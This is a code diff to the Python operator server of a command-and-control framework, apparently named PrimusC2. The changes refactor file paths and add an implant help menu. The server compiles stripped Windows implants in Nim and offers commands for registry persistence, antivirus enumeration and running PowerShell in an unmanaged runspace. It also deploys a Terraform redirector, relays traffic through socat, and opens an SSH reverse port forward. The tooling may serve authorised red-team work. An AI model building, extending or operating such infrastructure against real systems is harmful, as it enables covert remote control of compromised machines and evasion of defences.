@@ -40,9 +40,24 @@ def help():
     kill <sessions_val>         --> Terminate active callback
     exit                        --> exit from the server
 
-    Session Commands
+    Implant Commands
     ------------------------------------------------------------------------------------------------------
     background                  --> Backgrounds current sessions
+    persist                     --> Establish persistance trough registry keys(needs to be in the same
+                                    dir as the implant on target disk)
+    exit                        --> Terminate current session
+    GetAV                       --> Get the current AV running
+    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
+    ''')
+
+def help_implant():
+    print('''
+    ------------------------------------------------------------------------------------------------------
+    Implant Commands
+    ------------------------------------------------------------------------------------------------------
+    background                  --> Backgrounds current sessions
+    persist                     --> Establish persistance trough registry keys(needs to be in the same
+                                    dir as the implant on target disk)
     exit                        --> Terminate current session
     GetAV                       --> Get the current AV running
     pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
@@ -78,9 +93,6 @@ def comm_out(target_id, message):
     message = str(message + '\n')
     target_id.send(message.encode())
     
-    
-
-    
 
 def kill_signal(target_id, message):
     message = str(message)
@@ -92,7 +104,7 @@ def target_comm(target_id, targets, num):
         if len(message) == 0:
             continue
         if message == 'help':
-            help()
+            help_implant()
             
         else:
             comm_out(target_id, message)
@@ -105,7 +117,7 @@ def target_comm(target_id, targets, num):
                 break
 
             if message == 'help\n':
-                help()
+                help_implant()
            
             if message == 'persist\n':
                 payload_n = input('[*] Enter the name of the payload to add to persist: ')
@@ -181,10 +193,11 @@ def nimplant():
     global host_port
     random_name = randomname.get_name()
     compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
+    cwd_nim = os.getcwd()
     f_name= f'{compile_name}.nim'
     exe_file = f'{random_name}.exe'
-    file_loc = os.path.expanduser('~/PrimusC2/implant/implant.nim')
-    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
+    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant.nim')
+    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
     if os.path.exists(file_loc):
         shutil.copy(file_loc, f_name)
         shutil.move(f_name, implant_loc)
@@ -214,7 +227,7 @@ def nimplant():
         f.write(new_key)
         f.close()
     compile_cmd = [f"nim", "c", "-d:mingw", "-d:release", "--app:gui", "-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
-    for _ in track(range(8), description=f'[green][*] Compiling executeable {exe_file}...'):
+    for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
         process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         process.wait()
     implant_loc = os.path.join(implant_loc, exe_file)
@@ -222,7 +235,7 @@ def nimplant():
         print(f'[+] {exe_file} saved to {implant_loc}')   
     else:
         print('[-] An error occurred while compiling the implant')
-    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
+    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
     os.remove(f'{implant_loc}/{f_name}')
 
 def resolve_ip(interface):
@@ -295,11 +308,13 @@ def redirector(LPORT):
         shutil.move(priv_key_loc, key_loc)
         shutil.move(pub_key_loc, key_loc)
 
-    terra_loc = os.path.expanduser('~/PrimusC2/Terraform')
-    redir_loc = os.path.expanduser('~/PrimusC2/Templates/redirector_template.tf')
-    script_loc = os.path.expanduser('~/PrimusC2/Templates/script.sh')
-    redir_copy_loc = os.path.expanduser('~/PrimusC2/Terraform/redirector.tf')
-    script_copy_loc = os.path.expanduser('~/PrimusC2/Terraform/script.sh')
+    old_cwd = os.getcwd()
+    cwd = os.getcwd()
+    terra_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform')
+    redir_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/redirector_template.tf')
+    script_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/script.sh')
+    redir_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform/redirector.tf')
+    script_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform/script.sh')
     script_name = "script.sh"
     redirector_name = "redirector.tf"
     if os.path.exists(redir_loc):
@@ -331,20 +346,22 @@ def redirector(LPORT):
     re_ip_str = "".join(redir_ip)
     process.wait()
 
-    print('[*] Running socat realy trough SSH.. wait a moment.')
+    print('[*] Running socat relay trough SSH.. wait a moment.')
     subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
         shell=False,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         check=False)
     print('[+] Socat relay configured...')
-    print('[*] Setting up reverse port forward on localhost]')
+    print('[*] Setting up reverse port forward on localhost')
     os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
+    os.chdir(old_cwd)
 
    
 def exit_handler():
+    cwd = os.getcwd()
     print('[*] Destroying redirector infrastructure...')
-    terra_loc = os.path.expanduser('~/PrimusC2/Terraform')
+    terra_loc = os.path.expanduser(f'{cwd.strip("C2")}/Terraform')
     os.chdir(terra_loc)
     os.system("terraform destroy -auto-approve")
 
